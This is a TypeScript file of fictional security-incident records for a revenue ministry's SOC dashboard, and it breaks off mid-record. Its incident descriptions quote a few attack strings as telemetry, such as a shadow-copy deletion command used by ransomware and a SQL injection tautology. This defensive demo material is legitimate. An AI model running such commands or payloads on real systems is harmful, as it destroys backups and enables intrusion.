/**
 * Realistic Fictional Cybersecurity Incidents & Alerts Dataset
 * Ministry of Revenues (የገቢዎች ሚኒስቴር) - Centralized SOC
 * 
 * DISCLAIMER: All data, hostnames, IP addresses, users, and scenarios are fictional demonstration
 * telemetry designed specifically for security incident detection and operational analysis.
 */

import { Incident, Alert } from '../types/soc';

export const INITIAL_INCIDENTS: Incident[] = [
  {
    id: 'INC-2026-0101',
    title: 'Taxpayer Data Exposure: Unauthorized Bulk Financial Declarations Access',
    severity: 'critical',
    status: 'investigating',
    category: 'System',
    detectionTime: '2026-10-15 08:42:15',
    lastUpdated: '2026-10-15 10:12:45',
    affectedAssets: ['Tax Database Server (mor-db-cluster01.revenue.gov.et)'],
    assignedAnalyst: 'Biks Biset',
    source: 'Database Audit / DLP Sensor',
    summary: 'Potential data exposure detected involving unauthorized bulk access to corporate taxpayer financial declarations and VAT filings.',
    description: 'PostgreSQL audit extension flagged an abnormal query sequence pulling 14,200 records from `taxpayer_annual_declarations` table outside scheduled batch hours. The query was followed by an encrypted archive compression attempt staged toward an external IP address.',
    relatedAlertIds: ['ALT-1016', 'ALT-1009'],
    relatedEventIds: ['EVT-9001', 'EVT-9002'],
    recommendedSteps: [
      'Revoke active database session tokens and service account credentials for svc_bi_taxrep',
      'Enforce egress firewall block on destination IP 185.191.171.3 at perimeter Palo Alto firewalls',
      'Conduct forensic audit on exported tables: taxpayer_annual_declarations & corporate_filings',
      'Notify National Data Protection Authority and Large Taxpayers Directorate compliance officer',
      'Implement row-level encryption and anomalous query volume rate limiting on revenue database cluster'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 08:42:15',
        action: 'Incident Logged & Correlated',
        performedBy: 'Automated Correlation Engine',
        details: 'Detection triggered from abnormal database volume and unauthorized DLP alert ALT-1016.'
      },
      {
        timestamp: '2026-10-15 08:48:30',
        action: 'Analyst Triage & Assignment',
        performedBy: 'Biks Biset (SOC Analyst)',
        details: 'Assigned for forensic investigation of SQL query source and API service principal.'
      },
      {
        timestamp: '2026-10-15 09:30:20',
        action: 'Credential Revocation',
        performedBy: 'Biks Biset',
        details: 'Database session terminated and password rotated via Enterprise Secret Manager.'
      },
      {
        timestamp: '2026-10-15 09:35:40',
        action: 'Perimeter Egress Block Applied',
        performedBy: 'Endale Aychew (Security Admin)',
        details: 'Blocked staging destination IP 185.191.171.3 at perimeter firewall edge.'
      }
    ],
    timeline: [
      {
        id: 'TL-101-1',
        timestamp: '2026-10-15 08:42:15',
        user: 'Automated Correlation Engine',
        action: 'Incident created from Alert ALT-1016 (Suspicious access to taxpayer records)',
        type: 'status_change'
      },
      {
        id: 'TL-101-2',
        timestamp: '2026-10-15 08:48:30',
        user: 'Biks Biset (SOC Analyst)',
        action: 'Assigned incident to Biks Biset for deep database query profiling',
        type: 'assignment'
      },
      {
        id: 'TL-101-3',
        timestamp: '2026-10-15 09:15:00',
        user: 'Biks Biset',
        action: 'Linked correlated Alert ALT-1009 (Large outbound data transfer)',
        type: 'status_change'
      },
      {
        id: 'TL-101-4',
        timestamp: '2026-10-15 09:30:20',
        user: 'Biks Biset',
        action: 'Revoked API token for compromised reporting service principal svc_bi_taxrep',
        type: 'action_taken'
      }
    ],
    notes: [
      {
        id: 'NOTE-101-1',
        author: 'Biks Biset',
        role: 'SOC Analyst',
        timestamp: '2026-10-15 08:55:00',
        text: 'Query origin identified from application server mor-portal-app01 using service account svc_bi_taxrep. Query omitted standard branch filtering WHERE clause.'
      },
      {
        id: 'NOTE-101-2',
        author: 'Endale Aychew',
        role: 'Security Administrator',
        timestamp: '2026-10-15 09:40:12',
        text: 'Temporarily restricted egress traffic on mor-db-cluster01 to internal database subnet only. NetFlow monitoring active.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-101-1',
        actionName: 'Revoke Database Service Account Credentials',
        targetAsset: 'mor-db-cluster01.revenue.gov.et',
        initiatedBy: 'Biks Biset',
        timestamp: '2026-10-15 09:30:20',
        status: 'completed',
        resultDetails: 'Database session terminated and password rotated via Secret Manager.'
      },
      {
        id: 'ACT-101-2',
        actionName: 'Enforce Egress Block on Staging IP at Firewall',
        targetAsset: 'mor-ngfw-edge01.revenue.gov.et',
        initiatedBy: 'Endale Aychew',
        timestamp: '2026-10-15 09:35:40',
        status: 'completed',
        resultDetails: 'Blocked destination IP 185.191.171.3 in perimeter security ruleset.'
      }
    ]
  },
  {
    id: 'INC-2026-0102',
    title: 'Tax System Web Application Attack: Targeted SQL Injection & XSS Attempt',
    severity: 'critical',
    status: 'resolved',
    category: 'Web Application',
    detectionTime: '2026-10-15 07:15:30',
    lastUpdated: '2026-10-15 09:45:00',
    affectedAssets: ['Taxpayer Portal (mor-portal-app01.revenue.gov.et)', 'Web Application Server (mor-web-gateway.revenue.gov.et)'],
    assignedAnalyst: 'Endale Aychew',
    source: 'Web Application Firewall / NGINX Gateway',
    summary: 'Automated injection sequences attempting error-based UNION SELECT and stacked queries targeting taxpayer login and e-filing submission endpoints.',
    description: 'WAF detected over 16,500 malicious HTTP requests targeting `/portal/auth/login` and `/portal/api/taxpayer-vat-submit`. Payloads included SQL tautologies (`OR 1=1--`), stacked schema extracts, and stored cross-site scripting strings in taxpayer business name inputs.',
    relatedAlertIds: ['ALT-1003', 'ALT-1004'],
    relatedEventIds: ['EVT-9003', 'EVT-9004'],
    recommendedSteps: [
      'Deploy high-strictness WAF regex rule against UNION SELECT & stacked queries',
      'Block attacker IP range 45.134.20.0/24 at perimeter Palo Alto firewalls',
      'Audit web application transaction logs for any 200 OK responses with database error payloads',
      'Apply input sanitization and parameterized query patches in application code',
      'Execute continuous automated DAST security scanning on taxpayer submission endpoints'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 07:15:30',
        action: 'WAF Exploit Alert Escalated',
        performedBy: 'WAF Rule Correlator',
        details: 'High-volume SQL injection match triggered automated case opening.'
      },
      {
        timestamp: '2026-10-15 07:22:00',
        action: 'Analyst Assigned',
        performedBy: 'Endale Aychew',
        details: 'Threat pattern analyzed; attack identified as automated exploit scanner.'
      },
      {
        timestamp: '2026-10-15 07:45:10',
        action: 'Containment Enforced',
        performedBy: 'Endale Aychew',
        details: 'WAF strict ruleset deployed; source IP subnet dropped with 99.4% filter rate.'
      }
    ],
    timeline: [
      {
        id: 'TL-102-1',
        timestamp: '2026-10-15 07:15:30',
        user: 'WAF Rule Correlator',
        action: 'Alert ALT-1003 elevated to Incident INC-2026-0102',
        type: 'status_change'
      },
      {
        id: 'TL-102-2',
        timestamp: '2026-10-15 07:22:00',
        user: 'Endale Aychew (Security Admin)',
        action: 'Assigned to Endale Aychew and set status to Investigating',
        type: 'assignment'
      },
      {
        id: 'TL-102-3',
        timestamp: '2026-10-15 07:45:10',
        user: 'Endale Aychew',
        action: 'Applied WAF rate limiting and dynamic IP reputation drop filter; status updated to Contained',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-102-1',
        author: 'Endale Aychew',
        role: 'Security Administrator',
        timestamp: '2026-10-15 07:30:00',
        text: 'WAF dropped 99.4% of attempted injection queries before backend database received requests. Database transaction logs show zero successful query syntax anomalies.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-102-1',
        actionName: 'Deploy High-Strictness WAF Regex Pattern on Ingress',
        targetAsset: 'mor-portal-app01.revenue.gov.et',
        initiatedBy: 'Endale Aychew',
        timestamp: '2026-10-15 07:40:00',
        status: 'completed',
        resultDetails: 'Blocked source subnet 45.134.20.0/24 and enforced sanitization header filters.'
      }
    ]
  },
  {
    id: 'INC-2026-0103',
    title: 'Ransomware Detection: Pre-Ransomware Mass Shadow Copy Deletion Behavior',
    severity: 'critical',
    status: 'investigating',
    category: 'Malware',
    detectionTime: '2026-10-15 09:20:11',
    lastUpdated: '2026-10-15 10:15:00',
    affectedAssets: ['Employee Workstation (mor-ws-fin-042.revenue.gov.et)'],
    assignedAnalyst: 'Biks Biset',
    source: 'Endpoint EDR / Windows Defender for Endpoint',
    summary: 'Ransomware behavior detected on employee workstation with attempted shadow copy purging and mass file renaming.',
    description: 'Endpoint security telemetry on mor-ws-fin-042 reported process execution of `vssadmin.exe delete shadows /all /quiet` followed by high-velocity file modifications adding `.locked_mor` extensions to local documents and scanning adjacent revenue department SMB shares.',
    relatedAlertIds: ['ALT-1010', 'ALT-1005'],
    relatedEventIds: ['EVT-9005', 'EVT-9006'],
    recommendedSteps: [
      'Execute emergency EDR network isolation of infected workstation mor-ws-fin-042',
      'Terminate malicious process trees (PID 6412, vssadmin) and purge dropped payload in Public folder',
      'Verify integrity of Volume Shadow Copies and offline immutable NAS backups',
      'Deploy IOC file hash a4b12c89f28d... across all revenue endpoints via EDR fleet management',
      'Perform forensic memory dump extraction and scan adjacent departmental SMB file shares'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 09:20:11',
        action: 'Heuristic Ransomware Detection',
        performedBy: 'EDR Behavioral Engine',
        details: 'Rapid file encryption and shadow copy deletion command intercepted.'
      },
      {
        timestamp: '2026-10-15 09:22:45',
        action: 'Endpoint Network Isolation',
        performedBy: 'Biks Biset',
        details: 'Host network adapter quarantined within 2.5 minutes of first suspicious process execution.'
      }
    ],
    timeline: [
      {
        id: 'TL-103-1',
        timestamp: '2026-10-15 09:20:11',
        user: 'EDR Behavioral Engine',
        action: 'Alert ALT-1010 triggered high severity incident',
        type: 'status_change'
      },
      {
        id: 'TL-103-2',
        timestamp: '2026-10-15 09:22:45',
        user: 'Biks Biset (SOC Analyst)',
        action: 'Initiated immediate endpoint network isolation through EDR console',
        type: 'action_taken'
      }
    ],
    notes: [
      {
        id: 'NOTE-103-1',
        author: 'Biks Biset',
        role: 'SOC Analyst',
        timestamp: '2026-10-15 09:25:00',
        text: 'Host isolated within 2.5 minutes of first suspicious process execution. File system snapshots on central NAS remain intact without infection.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-103-1',
        actionName: 'Network Isolation of Employee Workstation',
        targetAsset: 'mor-ws-fin-042.revenue.gov.et',
        initiatedBy: 'Biks Biset',
        timestamp: '2026-10-15 09:22:45',
        status: 'completed',
        resultDetails: 'Host quarantined from internal corporate network; forensic capture active.'
      }
    ]
  },
  {
    id: 'INC-2026-0104',
    title: 'Privileged Account Compromise: Domain Administrator Suspicious Activity',
    severity: 'critical',
    status: 'investigating',
    category: 'Authentication',
    detectionTime: '2026-10-15 06:55:00',
    lastUpdated: '2026-10-15 08:50:30',
    affectedAssets: ['Active Directory Domain Controller (mor-dc-ad01.revenue.gov.et)'],
    assignedAnalyst: 'Endale Aychew',
    source: 'Active Directory / Kerberos Event Log',
    summary: 'Suspicious use of domain administrator account following repeated failed authentication attempts and abnormal off-hours ticket request.',
    description: 'Account `adm_tgirmai` experienced 140 failed NTLM logins from an unmanaged IP on the guest wireless segment, followed by a successful Kerberos TGT grant at 06:55 and unexpected addition of a temporary user to Enterprise Admins.',
    relatedAlertIds: ['ALT-1001', 'ALT-1002', 'ALT-1007'],
    relatedEventIds: ['EVT-9007', 'EVT-9008'],
    recommendedSteps: [
      'Immediately disable compromised administrator account adm_tgirmai in Active Directory',
      'Purge Kerberos Ticket Granting Ticket (krbtgt) password cache twice to invalidate existing sessions',
      'Audit Active Directory event logs (Event ID 4728) for unauthorized group membership changes',
      'Remove temp_operator99 from Enterprise Admins security group immediately',
      'Mandate FIDO2 hardware token MFA re-enrollment for all domain administrators'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 06:55:00',
        action: 'SIEM Correlation Triggered',
        performedBy: 'SIEM Correlation Engine',
        details: 'Correlated brute-force failures with sudden successful Kerberos logon.'
      },
      {
        timestamp: '2026-10-15 07:05:12',
        action: 'Account Disabled & Krbtgt Reset',
        performedBy: 'Endale Aychew',
        details: 'Disabled adm_tgirmai and invalidated active Kerberos TGT sessions.'
      }
    ],
    timeline: [
      {
        id: 'TL-104-1',
        timestamp: '2026-10-15 06:55:00',
        user: 'SIEM Correlation Engine',
        action: 'Correlated brute-force alert ALT-1001 with successful login alert ALT-1002',
        type: 'status_change'
      },
      {
        id: 'TL-104-2',
        timestamp: '2026-10-15 07:05:12',
        user: 'Endale Aychew',
        action: 'Disabled compromised domain administrator account and revoked all Kerberos tickets',
        type: 'action_taken'
      }
    ],
    notes: [
      {
        id: 'NOTE-104-1',
        author: 'Endale Aychew',
        role: 'Security Administrator',
        timestamp: '2026-10-15 07:15:00',
        text: 'Contacted employee T. Girmai who verified they were offline during the login timestamp. Credentials suspected compromised via password reuse or keylogger.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-104-1',
        actionName: 'Disable Account and Purge Kerberos Ticket Cache (krbtgt)',
        targetAsset: 'mor-dc-ad01.revenue.gov.et',
        initiatedBy: 'Endale Aychew',
        timestamp: '2026-10-15 07:05:12',
        status: 'completed',
        resultDetails: 'Account disabled and double password reset executed on krbtgt account.'
      }
    ]
  },
  {
    id: 'INC-2026-0105',
    title: 'Brute-Force Login Attack: Password Spraying against Revenue Staff SSO',
    severity: 'high',
    status: 'resolved',
    category: 'Authentication',
    detectionTime: '2026-10-15 05:30:20',
    lastUpdated: '2026-10-15 08:15:20',
    affectedAssets: ['Web Application Server (mor-web-gateway.revenue.gov.et)'],
    assignedAnalyst: 'Bethlehem Haile',
    source: 'SSO Authentication Gateway / Syslog',
    summary: 'Repeated failed authentication attempts against employee and administrator accounts across multiple tax branches.',
    description: 'Over 5,200 failed authentication events recorded within 45 minutes targeting 280 distinct employee accounts with common password variations. Attackers utilized 14 rotating external proxies to evade basic threshold locks.',
    relatedAlertIds: ['ALT-1001'],
    relatedEventIds: ['EVT-9009'],
    recommendedSteps: [
      'Deploy automated rate-limiting on SSO gateway for failure rates exceeding 10 attempts per minute',
      'Force password reset and credential invalidation for 8 target accounts with elevated attempts',
      'Verify CAPTCHA and adaptive authentication challenges on external login pages',
      'Review Active Directory lockout policy to ensure account lockout thresholds are enforced across all regional branches'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 05:30:20',
        action: 'Anomaly Detected',
        performedBy: 'SSO Anomaly Detection',
        details: 'Password spray detected from rotating proxy IPs.'
      },
      {
        timestamp: '2026-10-15 06:10:00',
        action: 'Rate Limiting Engaged',
        performedBy: 'Bethlehem Haile',
        details: 'Adaptive rate-limiting and geo-fencing applied on gateway.'
      },
      {
        timestamp: '2026-10-15 08:15:20',
        action: 'Incident Resolved',
        performedBy: 'Bethlehem Haile',
        details: 'Attacking proxy IPs fully blocked; zero unauthorized logins occurred.'
      }
    ],
    closedResolution: {
      resolvedAt: '2026-10-15 08:15:20',
      resolvedBy: 'Bethlehem Haile (Incident Responder)',
      rootCause: 'Distributed brute-force password spraying originated from commercial Tor/VPN proxy infrastructure targeting staff email addresses.',
      resolutionSummary: 'Applied IP reputation filtering and forced CAPTCHA on SSO gateway. Verified all targeted accounts remained uncompromised. Reset credentials for 8 highly targeted accounts.',
      preventativeAction: 'Enabled cloud-based adaptive risk-based authentication and enforced FIDO2 hardware tokens for all external access.'
    },
    timeline: [
      {
        id: 'TL-105-1',
        timestamp: '2026-10-15 05:30:20',
        user: 'SSO Anomaly Detection',
        action: 'Incident opened due to cross-tenant password spraying',
        type: 'status_change'
      },
      {
        id: 'TL-105-2',
        timestamp: '2026-10-15 06:10:00',
        user: 'Bethlehem Haile (Incident Responder)',
        action: 'Implemented geo-blocking and CAPTCHA challenge on external SSO portal',
        type: 'action_taken'
      },
      {
        id: 'TL-105-3',
        timestamp: '2026-10-15 08:15:20',
        user: 'Bethlehem Haile',
        action: 'Case marked resolved after 2 hours with zero further unauthorized attempts',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-105-1',
        author: 'Bethlehem Haile',
        role: 'Incident Responder',
        timestamp: '2026-10-15 06:30:00',
        text: 'Enforced mandatory MFA step-up across all staff login portals. No unauthorized accounts succeeded in establishing valid authenticated sessions.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-105-1',
        actionName: 'Enforce Global MFA Step-Up & Rate Limit on SSO Gateway',
        targetAsset: 'mor-web-gateway.revenue.gov.et',
        initiatedBy: 'Bethlehem Haile',
        timestamp: '2026-10-15 06:10:00',
        status: 'completed',
        resultDetails: 'Adaptive rate-limiting enabled; locked 8 accounts for manual analyst review.'
      }
    ]
  },
  {
    id: 'INC-2026-0106',
    title: 'Database Unauthorized Access: Suspicious Queries & Schema Dump Attempt',
    severity: 'high',
    status: 'investigating',
    category: 'System',
    detectionTime: '2026-10-15 08:12:40',
    lastUpdated: '2026-10-15 09:25:40',
    affectedAssets: ['Tax Database Server (mor-db-cluster01.revenue.gov.et)'],
    assignedAnalyst: 'Biks Biset',
    source: 'PostgreSQL Audit Logger (pgaudit)',
    summary: 'Suspicious queries, unusual database access volume, and attempted schema dumps on primary revenue databases.',
    description: 'PostgreSQL audit logger detected execution of `pg_dump` utility arguments via a reporting database connection pool, iterating over tax identification numbers (TIN) and auditor internal assessments.',
    relatedAlertIds: ['ALT-1008'],
    relatedEventIds: ['EVT-9010'],
    recommendedSteps: [
      'Terminate rogue PostgreSQL backend process and kill connection from tax_readonly_rep user',
      'Revoke schema dump and pg_catalog introspection privileges from application connection pools',
      'Audit database access control lists between application containers and primary database tier',
      'Examine database query logs to verify whether exported TIN tables were successfully transmitted'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 08:12:40',
        action: 'Anomaly Detected',
        performedBy: 'Database Security Monitor',
        details: 'Unusual query rate of 720 queries/sec detected on core tax schema.'
      },
      {
        timestamp: '2026-10-15 08:45:00',
        action: 'Connection Terminated',
        performedBy: 'Biks Biset',
        details: 'PostgreSQL process PID 21094 killed and originating container frozen.'
      }
    ],
    timeline: [
      {
        id: 'TL-106-1',
        timestamp: '2026-10-15 08:12:40',
        user: 'Database Security Monitor',
        action: 'Alert ALT-1008 triggered incident investigation',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-106-1',
        author: 'Biks Biset',
        role: 'SOC Analyst',
        timestamp: '2026-10-15 08:40:00',
        text: 'Examining connection string logs from revenue analytics connector. Query appears to originate from an unauthorized container instance.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-106-1',
        actionName: 'Terminate Rogue Database Connection & Freeze Container',
        targetAsset: 'mor-db-cluster01.revenue.gov.et',
        initiatedBy: 'Biks Biset',
        timestamp: '2026-10-15 08:45:00',
        status: 'completed',
        resultDetails: 'PostgreSQL backend process killed (PID 21094); client host IP blocked.'
      }
    ]
  },
  {
    id: 'INC-2026-0107',
    title: 'Revenue System Service Disruption: Layer-7 Flood on VAT Filing Application',
    severity: 'high',
    status: 'resolved',
    category: 'Network',
    detectionTime: '2026-10-15 10:05:00',
    lastUpdated: '2026-10-15 10:20:10',
    affectedAssets: ['Revenue Collection Application (mor-rev-core01.revenue.gov.et)'],
    assignedAnalyst: 'Mekonnen Wolde',
    source: 'Perimeter Edge Firewall / Load Balancer',
    summary: 'Possible denial-of-service activity affecting a tax filing or revenue collection service during peak taxpayer submission window.',
    description: 'Incoming HTTP POST requests surged to 85,000 req/min on `/api/v2/tax-declaration/submit`, saturating backend thread pools and increasing 504 gateway timeout rates to 28% for legitimate filers.',
    relatedAlertIds: ['ALT-1012'],
    relatedEventIds: ['EVT-9011'],
    recommendedSteps: [
      'Enable upstream DDoS scrubbing and managed challenge rules with national ISP (Ethio Telecom)',
      'Activate aggressive rate-limiting on VAT filing submission API endpoints',
      'Scale backend worker containers and allocate additional thread pools to revenue processing nodes',
      'Monitor error rate telemetry to ensure legitimate taxpayer submissions succeed without delay'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 10:05:00',
        action: 'Traffic Spike Flagged',
        performedBy: 'Perimeter Monitor',
        details: '85k req/min flood detected on VAT submission endpoint.'
      },
      {
        timestamp: '2026-10-15 10:12:00',
        action: 'Scrubbing Enabled',
        performedBy: 'Mekonnen Wolde',
        details: 'DDoS mitigation rules deployed; dropped 94% of malicious bot requests.'
      }
    ],
    timeline: [
      {
        id: 'TL-107-1',
        timestamp: '2026-10-15 10:05:00',
        user: 'Perimeter Monitor',
        action: 'Traffic anomaly threshold exceeded on revenue core endpoint',
        type: 'status_change'
      },
      {
        id: 'TL-107-2',
        timestamp: '2026-10-15 10:12:00',
        user: 'Mekonnen Wolde (Auditor/Analyst)',
        action: 'Enabled upstream DDoS scrubbing and managed challenge rules',
        type: 'action_taken'
      }
    ],
    notes: [
      {
        id: 'NOTE-107-1',
        author: 'Mekonnen Wolde',
        role: 'Auditor',
        timestamp: '2026-10-15 10:18:00',
        text: 'Scrubbing filter reduced malicious request volume by 94%. Application latency returned to normal sub-350ms operating range.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-107-1',
        actionName: 'Enable Cloud Scrubbing & Rate Limit on Inbound Revenue Endpoints',
        targetAsset: 'mor-rev-core01.revenue.gov.et',
        initiatedBy: 'Mekonnen Wolde',
        timestamp: '2026-10-15 10:12:00',
        status: 'completed',
        resultDetails: 'Mitigation rules engaged; malicious botnet signature fingerprints dropped at edge.'
      }
    ]
  },
  {
    id: 'INC-2026-0108',
    title: 'Insider Threat Indicator: Unusual Bulk Access to Confidential Taxpayer Records',
    severity: 'high',
    status: 'new',
    category: 'Other',
    detectionTime: '2026-10-15 09:50:35',
    lastUpdated: '2026-10-15 10:15:00',
    affectedAssets: ['Database Server (mor-taxdb-replica.revenue.gov.et)'],
    assignedAnalyst: 'Bethlehem Haile',
    source: 'Data Loss Prevention (DLP) / SIEM Correlation',
    summary: 'Unusual bulk access to confidential financial records or unauthorized file transfers by an authenticated employee.',
    description: 'Customs auditor account `k_mengistu` accessed and exported over 3,400 confidential tax assessment reports for high-net-worth commercial importers, inconsistent with regular regional duties and duty rosters.',
    relatedAlertIds: ['ALT-1016'],
    relatedEventIds: ['EVT-9012'],
    recommendedSteps: [
      'Immediately suspend database export permissions and reporting privileges for user k_mengistu',
      'Correlate accessed taxpayer accounts with employee active audit caseload in Tax Audit ERP',
      'Escalate incident report to Directorate of Ethics & Anti-Corruption and Internal Audit',
      'Inspect endpoint USB storage logs and web upload history on user assigned workstation'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 09:50:35',
        action: 'DLP Alert Generated',
        performedBy: 'DLP Audit Monitor',
        details: 'Bulk download of 3,400 confidential importer dossiers detected.'
      },
      {
        timestamp: '2026-10-15 10:08:00',
        action: 'Privileges Suspended',
        performedBy: 'Bethlehem Haile',
        details: 'User export role stripped in database RBAC directory pending investigation.'
      }
    ],
    timeline: [
      {
        id: 'TL-108-1',
        timestamp: '2026-10-15 09:50:35',
        user: 'DLP Audit Monitor',
        action: 'Alert ALT-1016 escalated to New Incident',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-108-1',
        author: 'Bethlehem Haile',
        role: 'Incident Responder',
        timestamp: '2026-10-15 10:05:00',
        text: 'Notified Internal Audit Directorate and temporarily suspended database export permissions for user account pending supervisor verification.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-108-1',
        actionName: 'Suspend File Export Privileges on Database Replica',
        targetAsset: 'mor-taxdb-replica.revenue.gov.et',
        initiatedBy: 'Bethlehem Haile',
        timestamp: '2026-10-15 10:08:00',
        status: 'completed',
        resultDetails: 'User export role stripped in database RBAC directory.'
      }
    ]
  },
  {
    id: 'INC-2026-0109',
    title: 'Malware Infection: Trojanized PDF & Obfuscated PowerShell Execution',
    severity: 'high',
    status: 'closed',
    category: 'Malware',
    detectionTime: '2026-10-15 08:05:12',
    lastUpdated: '2026-10-15 09:05:15',
    affectedAssets: ['Email Server (mor-mail-gw01.revenue.gov.et)', 'Employee Workstation (mor-ws-fin-042.revenue.gov.et)'],
    assignedAnalyst: 'Biks Biset',
    source: 'Mail Gateway AV / Endpoint EDR',
    summary: 'Malware detection on an employee endpoint or server with suspicious command execution sequences.',
    description: 'An inbound email disguised as a tax dispute notice contained an embedded malicious link and macro-enabled spreadsheet that triggered obfuscated PowerShell with `-EncodedCommand` attempting to download secondary payloads.',
    relatedAlertIds: ['ALT-1005', 'ALT-1006'],
    relatedEventIds: ['EVT-9013'],
    recommendedSteps: [
      'Block sender email address and file attachment SHA256 hash at secure mail gateway',
      'Purge malicious message from all 12 recipient employee inboxes before user opening',
      'Terminate spawned PowerShell processes on employee workstation and execute full EDR scan',
      'Verify sinkholing of external C2 staging domain on internal DNS resolvers'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 08:05:12',
        action: 'Gateway AV Flagged Malicious Message',
        performedBy: 'Email Security Gateway',
        details: 'Obfuscated PowerShell attachment detected.'
      },
      {
        timestamp: '2026-10-15 08:18:00',
        action: 'Mail Envelope Purged',
        performedBy: 'Biks Biset',
        details: 'Deleted from 12 inboxes before user execution.'
      },
      {
        timestamp: '2026-10-15 09:05:15',
        action: 'Case Officially Closed',
        performedBy: 'Endale Aychew',
        details: 'All recipient endpoints scanned clean; hash blocked globally.'
      }
    ],
    closedResolution: {
      resolvedAt: '2026-10-15 09:05:15',
      resolvedBy: 'Endale Aychew (Security Administrator)',
      rootCause: 'Phishing campaign targeting revenue finance auditors with weaponized macro-enabled tax dispute documents.',
      resolutionSummary: 'Mail gateway rule purged the email from all recipient inboxes. EDR on mor-ws-fin-042 blocked script execution and quarantined temporary payload files. Network proxy dropped the C2 connection.',
      preventativeAction: 'Updated email gateway sandboxing policy to auto-strip macro-enabled attachments and conducted targeted phishing awareness training for finance department.'
    },
    timeline: [
      {
        id: 'TL-109-1',
        timestamp: '2026-10-15 08:05:12',
        user: 'Email Security Gateway',
        action: 'Malware detection generated alert ALT-1005',
        type: 'status_change'
      },
      {
        id: 'TL-109-2',
        timestamp: '2026-10-15 08:14:00',
        user: 'Biks Biset (SOC Analyst)',
        action: 'Terminated parent process and quarantined mail gateway quarantine store',
        type: 'action_taken'
      },
      {
        id: 'TL-109-3',
        timestamp: '2026-10-15 09:05:15',
        user: 'Endale Aychew (Security Administrator)',
        action: 'Case verified clean and officially closed',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-109-1',
        author: 'Biks Biset',
        role: 'SOC Analyst',
        timestamp: '2026-10-15 08:25:00',
        text: 'Decoded base64 PowerShell command string revealed attempt to connect to external Pastebin clone for payload staging. Outbound request was blocked by web proxy.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-109-1',
        actionName: 'Purge Malicious Email Envelope from All Staff Inboxes',
        targetAsset: 'mor-mail-gw01.revenue.gov.et',
        initiatedBy: 'Biks Biset',
        timestamp: '2026-10-15 08:18:00',
        status: 'completed',
        resultDetails: 'Identified 12 recipient mailboxes; deleted message before user execution.'
      }
    ]
  },
  {
    id: 'INC-2026-0110',
    title: 'Data Exfiltration Indicator: Unusual Encrypted Outbound Data Stream',
    severity: 'critical',
    status: 'investigating',
    category: 'Network',
    detectionTime: '2026-10-15 09:12:00',
    lastUpdated: '2026-10-15 10:18:30',
    affectedAssets: ['Firewall (mor-ngfw-edge01.revenue.gov.et)', 'Tax Database Server (mor-db-cluster01.revenue.gov.et)'],
    assignedAnalyst: 'Endale Aychew',
    source: 'NetFlow Collector / Perimeter Firewall',
    summary: 'Unusual outbound traffic involving sensitive organizational data and high-volume external transfers.',
    description: 'Firewall flow analyzer identified a continuous 14.8 GB outbound encrypted transfer over non-standard port 8443 toward an unindexed cloud host in Seychelles originating from the server farm subnet.',
    relatedAlertIds: ['ALT-1009', 'ALT-1012'],
    relatedEventIds: ['EVT-9014'],
    recommendedSteps: [
      'Immediately sever active TCP connection and null-route destination IP 185.191.171.3 on edge BGP router',
      'Identify the local process initiating outbound traffic on tax database server cluster',
      'Capture PCAP network traffic and volatile memory image for payload decryption and forensic analysis',
      'Audit egress firewall policies to ensure non-standard high ports are strictly prohibited from core subnets'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 09:12:00',
        action: 'High-Volume Egress Detected',
        performedBy: 'NetFlow Anomaly Sensor',
        details: 'Continuous 14.8 GB stream to external Seychelles IP flagged.'
      },
      {
        timestamp: '2026-10-15 09:18:30',
        action: 'Session Severed & Route Nullified',
        performedBy: 'Endale Aychew',
        details: 'TCP session dropped; destination null-routed at edge.'
      }
    ],
    timeline: [
      {
        id: 'TL-110-1',
        timestamp: '2026-10-15 09:12:00',
        user: 'NetFlow Anomaly Sensor',
        action: 'Alert ALT-1009 elevated to Critical Incident',
        type: 'status_change'
      },
      {
        id: 'TL-110-2',
        timestamp: '2026-10-15 09:18:30',
        user: 'Endale Aychew',
        action: 'Severed active TCP session and blackholed route to remote host',
        type: 'action_taken'
      }
    ],
    notes: [
      {
        id: 'NOTE-110-1',
        author: 'Endale Aychew',
        role: 'Security Administrator',
        timestamp: '2026-10-15 09:30:00',
        text: 'Session severed after 4.2 GB transmitted. PCAP packet capture undergoing deep forensic analysis to determine whether encrypted payload contained customer tax PII.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-110-1',
        actionName: 'Drop TCP Connection & Null-Route Destination IP',
        targetAsset: 'mor-ngfw-edge01.revenue.gov.et',
        initiatedBy: 'Endale Aychew',
        timestamp: '2026-10-15 09:18:30',
        status: 'completed',
        resultDetails: 'Null route installed on core BGP gateway; external host unreachable.'
      }
    ]
  },
  {
    id: 'INC-2026-0111',
    title: 'DNS and Network Security Incident: Covert DNS Tunneling & C2 Channel',
    severity: 'medium',
    status: 'resolved',
    category: 'DNS and DHCP',
    detectionTime: '2026-10-15 07:48:22',
    lastUpdated: '2026-10-15 09:30:00',
    affectedAssets: ['DNS Server (mor-dns-pri01.revenue.gov.et)'],
    assignedAnalyst: 'Mekonnen Wolde',
    source: 'DNS Query Audit / Threat Intel Feed',
    summary: 'Suspicious DNS tunneling, malicious connections, or unusual network behavior detected in internal queries.',
